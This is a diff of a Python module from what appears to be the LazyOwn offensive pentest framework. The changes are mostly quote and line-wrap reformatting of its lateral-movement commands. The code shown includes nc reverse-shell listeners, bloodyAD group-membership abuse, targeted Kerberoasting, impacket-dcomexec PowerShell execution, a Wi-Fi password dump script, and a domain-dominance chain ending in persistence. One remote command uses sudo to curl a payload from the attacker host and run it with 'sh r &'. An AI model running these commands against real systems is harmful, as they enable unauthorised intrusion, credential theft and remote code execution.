@@ -134,8 +134,10 @@ class LateralMovementCommandSet(LazyOwnCommandSet):
         user = input("[?] Username (default: root): ") or "root"
         port = input("[?] Port (default: 22): ") or "22"
         self.cmd(f"ssh {user}@{rhost} -p {port}")
+
+
 for _lazy_name in dir(_lazy_utils):
-    if not _lazy_name.startswith('_'):
+    if not _lazy_name.startswith("_"):
         globals().setdefault(_lazy_name, getattr(_lazy_utils, _lazy_name))
 
 
@@ -212,7 +214,9 @@ class LateralMigratedCommandSet(LazyOwnCommandSet):
                     print_error("Invalid input. Please enter a number.")
                     return
             else:
-                print_error("Invalid command format. Use 'vpn' to list and select, or 'vpn <number>' to connect directly.")
+                print_error(
+                    "Invalid command format. Use 'vpn' to list and select, or 'vpn <number>' to connect directly."
+                )
                 return
 
         print_msg(f"Connecting to vpn/{file_to_connect}")
@@ -250,8 +254,8 @@ class LateralMigratedCommandSet(LazyOwnCommandSet):
         Note: Ensure you have the necessary permissions to create files and connect via SSH.
         """
 
-        rhost = self.params['rhost']
-        if not check_rhost(self.params['rhost']):
+        rhost = self.params["rhost"]
+        if not check_rhost(self.params["rhost"]):
             return
         if not line:
             print_error(f"must pass the user by argument like:{GREEN} id_rsa username")
@@ -260,30 +264,33 @@ class LateralMigratedCommandSet(LazyOwnCommandSet):
         print_msg(f"Try... nano {file}")
         self.cmd(f"nano {file} && chmod 600 {file}")
         format_key = input("Do you want to format the OpenSSH key? (y/n): ").lower()
-        if format_key == 'y':
+        if format_key == "y":
             with open(file) as key_file:
                 raw_key = key_file.read()
 
-            choice = input("    [?] do you wat format your rsa key ? 1) for openssh format or 2) for rsa_key format [1/2] (default: 1): ") or '1'
-            if choice == '1':
+            choice = (
+                input(
+                    "    [?] do you wat format your rsa key ? 1) for openssh format or 2) for rsa_key format [1/2] (default: 1): "
+                )
+                or "1"
+            )
+            if choice == "1":
                 formatted_key = format_openssh_key(raw_key)
 
-                with open(file, 'w') as key_file:
+                with open(file, "w") as key_file:
                     key_file.write(formatted_key)
 
                 print_msg("Key formatted and saved.")
-            elif choice == '2':
+            elif choice == "2":
                 formatted_key = format_rsa_key(raw_key)
 
-                with open(file, 'w') as key_file:
+                with open(file, "w") as key_file:
                     key_file.write(formatted_key)
 
                 print_msg("Key formatted and saved.")
             else:
                 print_warn("Wrong choice!")
-        print_msg(
-            f"{YELLOW} Connecting to ssh {line}@{self.params['rhost']} -i {file} {RED}[;,;] {RESET}"
-        )
+        print_msg(f"{YELLOW} Connecting to ssh {line}@{self.params['rhost']} -i {file} {RED}[;,;] {RESET}")
         self.onecmd("create_session_json")
         self.cmd(f"ssh {line}@{self.params['rhost']} -i {file}")
         print_warn("ssh connection closed")
@@ -342,7 +349,7 @@ class LateralMigratedCommandSet(LazyOwnCommandSet):
         $result = $results -join "`n"
         $outputFile = Join-Path $currentDir "wifi_passwords.txt"
         $result | Out-File -FilePath $outputFile -Encoding utf8
-        Write-Host "Wi-Fi passwords saved to $outputFile"'''.replace("        ",'')
+        Write-Host "Wi-Fi passwords saved to $outputFile"'''.replace("        ", "")
         copy2clip(command)
         return
 
@@ -388,27 +395,27 @@ class LateralMigratedCommandSet(LazyOwnCommandSet):
             self.cmd(f"git clone {bloodyad_git} {bloodyad_path}")
             self.cmd(f"cd {bloodyad_path} && pip3 install -r requirements.txt")
 
-        url = self.params['url']
-        rhost = self.params['rhost']
-        subdomain = self.params['subdomain']
-        domain = self.params['domain']
+        url = self.params["url"]
+        rhost = self.params["rhost"]
+        subdomain = self.params["subdomain"]
+        domain = self.params["domain"]
         path = os.getcwd()
         if line.startswith("pass"):
             credentials = get_credentials()
             if not credentials:
                 return
             for user, passwd in credentials:
-                cn = input("    [!] Enter CN= example SERVICE ACCOUNTS: ") or 'SERVICE ACCOUNTS'
+                cn = input("    [!] Enter CN= example SERVICE ACCOUNTS: ") or "SERVICE ACCOUNTS"
                 cmd = f"bloodyAD --host '{self.params['rhost']}' -d '{subdomain}.{self.params['domain']}' -u '{user}' -p '{passwd}'  add groupMember '{cn}' {user}"
                 self.cmd(cmd)
                 return
         elif line.startswith("cache"):
             users_txt = get_users_dic()
             domain = get_domain(url)
-            ca = self.params['domain'].split(".") if self.params['domain'] else []
+            ca = self.params["domain"].split(".") if self.params["domain"] else []
             base_domain = ca[0].upper() if len(ca) > 0 else ""
             ext = ca[1].upper() if len(ca) > 1 else ""
-            if not check_rhost(self.params['rhost']):
+            if not check_rhost(self.params["rhost"]):
                 return
 
             cn = input("    [!] Enter CN= example CHIEFS MARKETING: ")
@@ -420,7 +427,9 @@ class LateralMigratedCommandSet(LazyOwnCommandSet):
             with open(users_txt) as file:
                 users = [user.strip() for user in file]
 
-            print_msg("Select a user by number to execute the command for a specific user, or press Enter to execute for all users:")
+            print_msg(
+                "Select a user by number to execute the command for a specific user, or press Enter to execute for all users:"
+            )
             for idx, user in enumerate(users, start=1):
                 print_warn(f"{idx}. {user}")
 
@@ -428,12 +437,12 @@ class LateralMigratedCommandSet(LazyOwnCommandSet):
             sub = input("enter the subdomain example dc01: ")
             if selection.isdigit():
                 selected_user = users[int(selection) - 1]
-                command = f"export KRB5CCNAME=/tmp/{selected_user}.ccache ; {bloodyad_path}/bloodyAD.py --host {sub}.{self.params['domain']} -d {self.params['domain']} --dc-ip {self.params['rhost']} -u {selected_user} -k  add groupMember \"CN={cn},CN=USERS,DC={base_domain},DC={ext}\" {selected_user}"
+                command = f'export KRB5CCNAME=/tmp/{selected_user}.ccache ; {bloodyad_path}/bloodyAD.py --host {sub}.{self.params["domain"]} -d {self.params["domain"]} --dc-ip {self.params["rhost"]} -u {selected_user} -k  add groupMember "CN={cn},CN=USERS,DC={base_domain},DC={ext}" {selected_user}'
                 print_msg(command)
                 self.cmd(command)
             else:
                 for user in users:
-                    command = f"export KRB5CCNAME=/tmp/{user}.ccache ; {bloodyad_path}/bloodyAD.py --host {sub}.{self.params['domain']} -d {self.params['domain']} --dc-ip {self.params['rhost']} -u {user} -k add groupMember \"CN={cn},CN=USERS,DC={base_domain},DC={ext}\" {user}"
+                    command = f'export KRB5CCNAME=/tmp/{user}.ccache ; {bloodyad_path}/bloodyAD.py --host {sub}.{self.params["domain"]} -d {self.params["domain"]} --dc-ip {self.params["rhost"]} -u {user} -k add groupMember "CN={cn},CN=USERS,DC={base_domain},DC={ext}" {user}'
                     print_msg(command)
                     self.cmd(command)
         return
@@ -455,12 +464,12 @@ class LateralMigratedCommandSet(LazyOwnCommandSet):
         Returns:
         None
         """
-        url = self.params['url']
+        url = self.params["url"]
         domain = get_domain(url)
-        rhost = self.params['rhost']
+        rhost = self.params["rhost"]
         os.getcwd()
 
-        if not check_rhost(self.params['rhost']):
+        if not check_rhost(self.params["rhost"]):
             return
 
         path_cred = "sessions/credentials.txt"
@@ -541,11 +550,11 @@ class LateralMigratedCommandSet(LazyOwnCommandSet):
 
             choice = input("Enter choice (1 or 2): ").strip()
 
-            if choice == '1':
+            if choice == "1":
                 self.cmd("sudo apt-get install shadowsocks-libev -y")
                 print_msg("Shadowsocks installed using package manager.")
 
-            elif choice == '2':
+            elif choice == "2":
                 self.cmd("cargo install shadowsocks-rust")
 
             else:
@@ -556,31 +565,39 @@ class LateralMigratedCommandSet(LazyOwnCommandSet):
         else:
             mode = line
 
-        if mode == '1':
-            lport = self.params['lport']
+        if mode == "1":
+            lport = self.params["lport"]
             password = input("    [!] Enter the Shadowsocks password: ").strip()
-            method = input("    [!] Enter the encryption method (e.g., 'aes-256-gcm', 'aes-256-cfb', 'chacha20', etc.): ").strip() or 'aes-256-gcm'
+            method = (
+                input(
+                    "    [!] Enter the encryption method (e.g., 'aes-256-gcm', 'aes-256-cfb', 'chacha20', etc.): "
+                ).strip()
+                or "aes-256-gcm"
+            )
 
-            command = (
-                f"ssserver -s '[::]:{lport}' -m '{method}' -k '{password}' -u"
-            ).strip()
+            command = (f"ssserver -s '[::]:{lport}' -m '{method}' -k '{password}' -u").strip()
 
             print_msg(f"Generated server command: {command}")
 
-            lhost = self.params['lhost']
+            lhost = self.params["lhost"]
             client_command = f"sslocal -b '127.0.0.1:1080' -s '{self.params['lhost']}:{lport}' -m '{method}' -k '{password}' -u --outbound-bind-interface lo0"
             copy2clip(client_command)
             print_msg(f"Client command copied to clipboard: {client_command}")
 
             self.cmd(command)
 
-        elif mode == '2':
-            rhost = self.params['rhost']
-            rport = self.params['rport']
-            server_address = input("    [!] Enter the Shadowsocks server address: ").strip() or self.params['rhost']
+        elif mode == "2":
+            rhost = self.params["rhost"]
+            rport = self.params["rport"]
+            server_address = input("    [!] Enter the Shadowsocks server address: ").strip() or self.params["rhost"]
             server_port = input("    [!] Enter the Shadowsocks server port: ").strip() or rport
             password = input("    [!] Enter the Shadowsocks password: ").strip()
-            method = input("    [!] Enter the encryption method (e.g., 'aes-256-gcm', 'aes-256-cfb', 'chacha20', etc.): ").strip() or 'aes-256-gcm'
+            method = (
+                input(
+                    "    [!] Enter the encryption method (e.g., 'aes-256-gcm', 'aes-256-cfb', 'chacha20', etc.): "
+                ).strip()
+                or "aes-256-gcm"
+            )
 
             command = (
                 f"sslocal -b '127.0.0.1:1080' -s '{server_address}:{server_port}' -m '{method}' -k '{password}' -u --outbound-bind-interface lo0"
@@ -621,19 +638,17 @@ class LateralMigratedCommandSet(LazyOwnCommandSet):
         - `nc`: A tool used for creating reverse shells or bind shells.
         """
 
-        lport = self.params['lport']
+        lport = self.params["lport"]
         if not lport and not line:
-            print_error(
-                f"lport must be assign or pass the port by parameter like: nc 6666.{RESET}"
-            )
+            print_error(f"lport must be assign or pass the port by parameter like: nc 6666.{RESET}")
             return
         if not line:
-                if int(lport) < 1024:
-                    print_msg(f"Try.. sudo rlwrap  --always-readline nc -lvnp {lport}{RESET}")
-                    self.cmd(f"sudo rlwrap  --always-readline nc -lvnp {lport}")
-                else:
-                    print_msg(f"Try.. rlwrap  --always-readline nc -lvnp {lport}{RESET}")
-                    self.cmd(f"rlwrap  --always-readline nc -lvnp {lport}")
+            if int(lport) < 1024:
+                print_msg(f"Try.. sudo rlwrap  --always-readline nc -lvnp {lport}{RESET}")
+                self.cmd(f"sudo rlwrap  --always-readline nc -lvnp {lport}")
+            else:
+                print_msg(f"Try.. rlwrap  --always-readline nc -lvnp {lport}{RESET}")
+                self.cmd(f"rlwrap  --always-readline nc -lvnp {lport}")
         else:
             if line.startswith("file"):
                 args = line.split(" ")
@@ -655,9 +670,7 @@ class LateralMigratedCommandSet(LazyOwnCommandSet):
                 else:
                     print_msg(f"Try.. rlwrap  --always-readline nc -lvnp {line}{RESET}")
                     self.cmd(f"rlwrap  --always-readline nc -lvnp {line}")
-        print_msg(
-            f"{RED}[*] {YELLOW} Shutdown rlwrap nc sessions in port {RED} [{lport}|{line}] {RESET}"
-        )
+        print_msg(f"{RED}[*] {YELLOW} Shutdown rlwrap nc sessions in port {RED} [{lport}|{line}] {RESET}")
         return
 
     @cmd2.with_category("08. Lateral Movement")
@@ -705,14 +718,14 @@ class LateralMigratedCommandSet(LazyOwnCommandSet):
             "RbMemcache",
             "PhpMemcache",
             "DmpMemcache",
-            "SMTP"
+            "SMTP",
         ]
 
         for i, exploit in enumerate(exploits, 1):
             print_msg(f"{i}. {exploit}")
 
         if not line:
-            choice = input("Select the exploit number: ") or '8'
+            choice = input("Select the exploit number: ") or "8"
         else:
             choice = line.strip()
 
@@ -751,11 +764,11 @@ class LateralMigratedCommandSet(LazyOwnCommandSet):
             None
         """
         sessions_dir = "sessions"
-        rhost = self.params['rhost']
-        domain = self.params['domain']
-        subdomain = self.params['subdomain']
+        rhost = self.params["rhost"]
+        domain = self.params["domain"]
+        subdomain = self.params["subdomain"]
         fulldomain = f"{subdomain}.{self.params['domain']}"
-        if os.path.exists(os.path.join(sessions_dir, 'credentials.txt')):
+        if os.path.exists(os.path.join(sessions_dir, "credentials.txt")):
             if line:
                 credentials = get_credentials(ncred=int(line))
             else:
@@ -808,7 +821,7 @@ class LateralMigratedCommandSet(LazyOwnCommandSet):
         exploit_dir = os.path.join(path, "external/.exploit")
         penelope_url = "https://github.com/brightio/penelope.git"
         penelope_dir = os.path.join(exploit_dir, "penelope")
-        default_port = self.params['lport']
+        default_port = self.params["lport"]
         os.makedirs(exploit_dir, exist_ok=True)
 
         if not os.path.exists(penelope_dir):
@@ -818,13 +831,19 @@ class LateralMigratedCommandSet(LazyOwnCommandSet):
             print_msg("Penelope already cloned, skipping cloning.")
 
         if not line:
-            port = input(f"    {GREEN}[!] Enter the port to listen/connect to (default {default_port}): ").strip() or default_port
-            interface = input("    [?] Enter the interface or IP address to listen on (optional, default is 0.0.0.0): ").strip() or "0.0.0.0"
+            port = (
+                input(f"    {GREEN}[!] Enter the port to listen/connect to (default {default_port}): ").strip()
+                or default_port
+            )
+            interface = (
+                input("    [?] Enter the interface or IP address to listen on (optional, default is 0.0.0.0): ").strip()
+                or "0.0.0.0"
+            )
             connect = input("    [?] Enter the bind shell host (optional): ").strip()
-            show_payloads = input("    [?] Show sample payloads for reverse shell? (y/n): ").strip().lower() == 'y'
-            list_interfaces = input("    [?] Show the available network interfaces? (y/n): ").strip().lower() == 'y'
+            show_payloads = input("    [?] Show sample payloads for reverse shell? (y/n): ").strip().lower() == "y"
+            list_interfaces = input("    [?] Show the available network interfaces? (y/n): ").strip().lower() == "y"
             maintain_shells = input("    [?] Maintain total shells per target? Enter number (optional): ").strip()
-            serve_files = input("    [?] Serve files via HTTP? (y/n): ").strip().lower() == 'y'
+            serve_files = input("    [?] Serve files via HTTP? (y/n): ").strip().lower() == "y"
             file_server_port = input("    [?] Enter file server port (default 8000): ").strip() or "8000"
             file_server_password = input("    [?] Enter URL prefix password (optional): ").strip()
         else:
@@ -844,13 +863,13 @@ class LateralMigratedCommandSet(LazyOwnCommandSet):
             s_flag = False
 
             for i in range(1, len(args)):
-                if args[i] == '-i':
+                if args[i] == "-i":
                     i_flag = True
                     continue
-                if args[i] == '-c':
+                if args[i] == "-c":
                     c_flag = True
                     continue
-                if args[i] == '-s':
+                if args[i] == "-s":
                     s_flag = True
                     continue
 
@@ -863,14 +882,14 @@ class LateralMigratedCommandSet(LazyOwnCommandSet):
                 elif s_flag:
                     file_server_port = args[i]
                     s_flag = False
-                elif args[i] == '-a':
+                elif args[i] == "-a":
                     show_payloads = True
-                elif args[i] == '-l':
+                elif args[i] == "-l":
                     list_interfaces = True
-                elif args[i].startswith('-m'):
-                    maintain_shells = args[i+1]
-                elif args[i] == '-pass':
-                    file_server_password = args[i+1]
+                elif args[i].startswith("-m"):
+                    maintain_shells = args[i + 1]
+                elif args[i] == "-pass":
+                    file_server_password = args[i + 1]
 
         command = f"python3 {penelope_dir}/penelope.py {port}"
         if interface:
@@ -959,8 +978,8 @@ class LateralMigratedCommandSet(LazyOwnCommandSet):
         Returns:
         None
         """
-        lport = self.params['lport']
-        url = self.params['url']
+        lport = self.params["lport"]
+        url = self.params["url"]
         path = os.getcwd()
         reGeorg_git = "https://github.com/sensepost/reGeorg.git"
         reGeorg_dir = os.path.join(path, "external/.exploit/reGeorg")
@@ -1017,14 +1036,25 @@ class LateralMigratedCommandSet(LazyOwnCommandSet):
             self.cmd(f"pip3 install -r {targetedKerberoast_path}/requirements.txt")
             print_msg("Installation completed.")
 
-        rhost = self.params['rhost']
-        domain = self.params['domain']
+        rhost = self.params["rhost"]
+        domain = self.params["domain"]
         username = input("    [!] Enter the target username (default: administrator): ").strip() or "administrator"
-        dc_ip = input(f"    [!] Enter the Domain Controller IP for {self.params['domain']} (e.g., {self.params['rhost']}): ").strip() or self.params['rhost']
-        output_file = input(f"    [!] Enter the output filename for hashes (default: sessions/{self.params['rhost']}_kerberoast_hashes.txt): ").strip() or f"sessions/{self.params['rhost']}_kerberoast_hashes.txt"
-        auth_choice = input("    [!] Authenticate using password or hash (default: password): ").strip().lower() or "password"
+        dc_ip = (
+            input(
+                f"    [!] Enter the Domain Controller IP for {self.params['domain']} (e.g., {self.params['rhost']}): "
+            ).strip()
+            or self.params["rhost"]
+        )
+        output_file = (
+            input(
+                f"    [!] Enter the output filename for hashes (default: sessions/{self.params['rhost']}_kerberoast_hashes.txt): "
+            ).strip()
+            or f"sessions/{self.params['rhost']}_kerberoast_hashes.txt"
+        )
+        auth_choice = (
+            input("    [!] Authenticate using password or hash (default: password): ").strip().lower() or "password"
+        )
         if auth_choice == "password":
-
             credentials = get_credentials()
 
             if not credentials:
@@ -1037,7 +1067,9 @@ class LateralMigratedCommandSet(LazyOwnCommandSet):
             hashis = get_hash()
             auth_param = f"-H '{hashis}'"
 
-        verbosity = input("    [!] Set verbosity level (1 for verbose, 2 for debug, default: quiet): ").strip() or "quiet"
+        verbosity = (
+            input("    [!] Set verbosity level (1 for verbose, 2 for debug, default: quiet): ").strip() or "quiet"
+        )
         verbosity_param = "-q" if verbosity == "quiet" else "-v" * int(verbosity)
         targetedKerberoast_command = (
             f"python3 {targetedKerberoast_path}/targetedKerberoast.py -v - -d {self.params['domain']} -u {username} "
@@ -1071,17 +1103,17 @@ class LateralMigratedCommandSet(LazyOwnCommandSet):
         None
         """
 
-        rhost = self.params['rhost']
-        lhost = self.params['lhost']
-        domain = self.params['domain']
+        rhost = self.params["rhost"]
+        lhost = self.params["lhost"]
+        domain = self.params["domain"]
         os.getcwd()
         if not is_binary_present("impacket-dcomexec"):
             print_warn("impacket-dcomexec is not installed. Installing.")
             self.cmd("sudo apt install impacket -y")
             return
-        if not check_rhost(self.params['rhost']):
+        if not check_rhost(self.params["rhost"]):
             return
-        self.onecmd('createrevshell')
+        self.onecmd("createrevshell")
         if line == "pass":
             credentials = get_credentials()
             if not credentials:
@@ -1104,7 +1136,7 @@ class LateralMigratedCommandSet(LazyOwnCommandSet):
                 hashis = f"-hashes {hash_value}"
             else:
                 hashis = f"-hashes :{hash_value}"
-            user = input("    [!] Enter Username (default: Administrator): ") or 'Administrator'
+            user = input("    [!] Enter Username (default: Administrator): ") or "Administrator"
             command = (
                 f"impacket-dcomexec -object MMC20 -silentcommand -debug "
                 f"{hashis} {self.params['domain']}/{user}@{self.params['rhost']} 'powershell.exe Invoke-WebRequest "
@@ -1145,7 +1177,7 @@ class LateralMigratedCommandSet(LazyOwnCommandSet):
                 print_error("Error")
         else:
             print("else")
-            line = input ("    [!] Enter the path: ") or 'puertos'
+            line = input("    [!] Enter the path: ") or "puertos"
             self.upload_file_to_c2(line)
 
     @cmd2.with_category("08. Lateral Movement")
@@ -1206,8 +1238,8 @@ class LateralMigratedCommandSet(LazyOwnCommandSet):
         if not is_binary_present("wmiexec-pro.py"):
             install_wmiexecpro()
 
-        rhost = self.params['rhost']
-        domain = self.params['domain']
+        rhost = self.params["rhost"]
+        domain = self.params["domain"]
 
         path_cred = get_credentials(True)
 
@@ -1240,8 +1272,16 @@ class LateralMigratedCommandSet(LazyOwnCommandSet):
 
                 print_warn("Select the module you want to use:")
                 modules = [
-                    "enum", "amsi", "exec-command", "filetransfer", "rdp", "winrm",
-                    "firewall", "service", "eventlog", "rid-hijack"
+                    "enum",
+                    "amsi",
+                    "exec-command",
+                    "filetransfer",
+                    "rdp",
+                    "winrm",
+                    "firewall",
+                    "service",
+                    "eventlog",
+                    "rid-hijack",
                 ]
                 for i, module in enumerate(modules, start=1):
                     print_msg(f"{i}. {module}")
@@ -1263,7 +1303,7 @@ class LateralMigratedCommandSet(LazyOwnCommandSet):
                         "firewall": ["-search-port", "-dump", "-rule-id", "-firewall-profile"],
                         "service": ["-action", "-dump"],
                         "eventlog": ["-risk-i-know", "-retrive"],
-                        "rid-hijack": ["-user", "-action", "-hijack-rid", "-blank-pass-login", "-remove", "-restore"]
+                        "rid-hijack": ["-user", "-action", "-hijack-rid", "-blank-pass-login", "-remove", "-restore"],
                     }
 
                     print_warn(f"Select the action for {module}:")
@@ -1278,25 +1318,20 @@ class LateralMigratedCommandSet(LazyOwnCommandSet):
                     action = actions[module][action_choice]
 
                     options_dict = {
-                        "enum": {
-                            "-run": []
-                        },
-                        "amsi": {
-                            "-enable": [],
-                            "-disable": []
-                        },
+                        "enum": {"-run": []},
+                        "amsi": {"-enable": [], "-disable": []},
                         "exec-command": {
                             "-shell": [],
                             "-command": ["-command", "-silent", "-old", "-save"],
                             "-silent": [],
                             "-old": [],
                             "-save": [],
-                            "-clear": []
+                            "-clear": [],
                         },
                         "filetransfer": {
                             "-upload": ["-src-file", "-dest-file"],
                             "-download": ["-src-file", "-dest-file"],
-                            "-clear": []
+                            "-clear": [],
                         },
                         "rdp": {
                             "-enable": [],
@@ -1304,34 +1339,25 @@ class LateralMigratedCommandSet(LazyOwnCommandSet):
                             "-enable-ram": [],
                             "-disable": [],
                             "-disable-old": [],
-                            "-disable-ram": []
+                            "-disable-ram": [],
                         },
-                        "winrm": {
-                            "-enable": [],
-                            "-disable": []
-                        },
+                        "winrm": {"-enable": [], "-disable": []},
                         "firewall": {
                             "-search-port": ["-port"],
                             "-dump": [],
                             "-rule-id": ["-action"],
-                            "-firewall-profile": ["-action"]
+                            "-firewall-profile": ["-action"],
                         },
-                        "service": {
-                            "-action": ["-service-name", "-display-name", "-bin-path", "-class"],
-                            "-dump": []
-                        },
-                        "eventlog": {
-                            "-risk-i-know": [],
-                            "-retrive": ["-object-ID"]
-                        },
+                        "service": {"-action": ["-service-name", "-display-name", "-bin-path", "-class"], "-dump": []},
+                        "eventlog": {"-risk-i-know": [], "-retrive": ["-object-ID"]},
                         "rid-hijack": {
                             "-user": ["-action", "-hijack-rid"],
                             "-action": ["-user"],
                             "-hijack-rid": ["-user"],
                             "-blank-pass-login": ["-enable", "-disable"],
                             "-remove": ["-user"],
-                            "-restore": ["-backup-file"]
-                        }
+                            "-restore": ["-backup-file"],
+                        },
                     }
 
                     options = []
@@ -1342,13 +1368,20 @@ class LateralMigratedCommandSet(LazyOwnCommandSet):
 
                         while True:
                             try:
-                                option_choice = int(input("    [!] Enter the number corresponding to the option (or 0 to finish): ")) - 1
+                                option_choice = (
+                                    int(
+                                        input("    [!] Enter the number corresponding to the option (or 0 to finish): ")
+                                    )
+                                    - 1
+                                )
                                 if option_choice == -1:
                                     break
                                 if option_choice < 0 or option_choice >= len(options_dict[module][action]):
                                     print_error("Invalid choice. Please select a valid number.")
                                     continue
-                                option_value = input(f"    [!] Enter the value for {options_dict[module][action][option_choice]}: ").strip()
+                                option_value = input(
+                                    f"    [!] Enter the value for {options_dict[module][action][option_choice]}: "
+                                ).strip()
                                 options.append(f"{options_dict[module][action][option_choice]} {option_value}")
                             except ValueError:
                                 print_error("Invalid input. Please enter a valid number.")
@@ -1382,10 +1415,10 @@ class LateralMigratedCommandSet(LazyOwnCommandSet):
 
         print_error("Downloading LazyOwn" + self.url_download)
 
-        version = self.version.replace("/","-")
+        version = self.version.replace("/", "-")
         name = "LazyOwn_CRIMEN.tar.gz"
-        rhost = self.params['rhost']
-        lhost = self.params['lhost']
+        rhost = self.params["rhost"]
+        lhost = self.params["lhost"]
         tmp = "/tmp/lazyown_atomic_test"
         self.cmd(f"mkdir -p {tmp}")
         sessions = f"{self.path}/sessions/"
@@ -1401,19 +1434,26 @@ class LateralMigratedCommandSet(LazyOwnCommandSet):
             print_error("start_user and start_pass must be configured in payload.json")
             return
         from core.hardening import set_sshpass_env
+
         _env = set_sshpass_env(password)
         ssh_args = [
-            "sshpass", "-e", "ssh", f"{username}@{self.params['rhost']}",
+            "sshpass",
+            "-e",
+            "ssh",
+            f"{username}@{self.params['rhost']}",
             f"mkdir -p {tmp} ; cd {tmp} ; {command_remote} ; "
             f"if [ ! -s {name} ]; then echo 'Error: File is empty'; exit 1; fi ; "
             f"tar -vzxf {name} ; "
-            f"echo \"{password}\" | sudo -S curl http://{self.params['lhost']}/r -o r ; "
-            f"sh r &"
+            f'echo "{password}" | sudo -S curl http://{self.params["lhost"]}/r -o r ; '
+            f"sh r &",
         ]
         subprocess.run(ssh_args, shell=False, env=_env, check=False)
         ssh_install_args = [
-            "sshpass", "-e", "ssh", f"{username}@{self.params['rhost']}",
-            f"cd {tmp}/LazyOwn-{version} ; echo \"{password}\" | sudo -S bash install.sh &"
+            "sshpass",
+            "-e",
+            "ssh",
+            f"{username}@{self.params['rhost']}",
+            f'cd {tmp}/LazyOwn-{version} ; echo "{password}" | sudo -S bash install.sh &',
         ]
         subprocess.run(ssh_install_args, shell=False, env=_env, check=False)
         return
@@ -1430,7 +1470,7 @@ class LateralMigratedCommandSet(LazyOwnCommandSet):
             None
         """
         if not line:
-            line = input("    [!] Enter the client_id (default: no_priv): ") or 'no_priv'
+            line = input("    [!] Enter the client_id (default: no_priv): ") or "no_priv"
         self.c2_clientid = line.strip()
 
     @cmd2.with_category("08. Lateral Movement")
@@ -1471,7 +1511,9 @@ class LateralMigratedCommandSet(LazyOwnCommandSet):
 
             dd = DomainDominance()
             print_msg(f"Starting domain dominance operation against {domain} (DC: {dc_ip})")
-            print_msg("Phases: domain_recon -> user_enum -> credential_extraction -> lateral_movement -> privilege_escalation -> persistence")  # noqa: E501
+            print_msg(
+                "Phases: domain_recon -> user_enum -> credential_extraction -> lateral_movement -> privilege_escalation -> persistence"
+            )  # noqa: E501
             result = dd.dominate(
                 domain=domain,
                 dc_ip=dc_ip,
